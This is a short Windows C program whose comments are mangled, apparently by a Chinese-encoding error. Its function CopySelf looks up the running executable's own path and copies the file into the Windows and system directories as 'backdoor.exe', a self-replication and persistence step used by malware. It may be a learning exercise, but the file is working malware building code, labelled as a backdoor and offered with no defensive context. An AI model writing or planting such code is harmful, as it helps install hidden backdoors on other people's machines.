#include <windows.h>
#include <stdio.h>
#include<string.h>

//ԭ��
//DWORD WINAPI GetModuleFileName(
//	HMODULE hModule,
//	LPTSTR lpFileName,
//	DWORD nSize
//);

//hModule��Ҫ��ȡ�ļ�����ģ������, null��ʾ��ǰģ��
//lpFileName : ������������ȡ�õ��ļ���
//	nSize : lpFileName�����ĳ���

void CopySelf()
{
    // ������������·��
    TCHAR szSelfName[MAX_PATH] = { 0 };
    // ����WindowsĿ¼��·��
    TCHAR szWindowsPath[MAX_PATH] = { 0 };
    // ����ϵͳĿ¼��·��
	TCHAR szSystemPath[MAX_PATH] = { 0 };
    // ��ʱ·������
	TCHAR szTmpPath[MAX_PATH] = { 0 };

    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    GetWindowsDirectory(szWindowsPath, MAX_PATH);
    GetSystemDirectory(szSystemPath, MAX_PATH);

    strcat(szWindowsPath, "\\backdoor.exe");
    strcat(szSystemPath, "\\backdoor.exe");

    CopyFile(szSelfName, szWindowsPath, FALSE);
    CopyFile(szSelfName, szSystemPath, FALSE);
}

int main()
{
    CopySelf();

    return 0;
}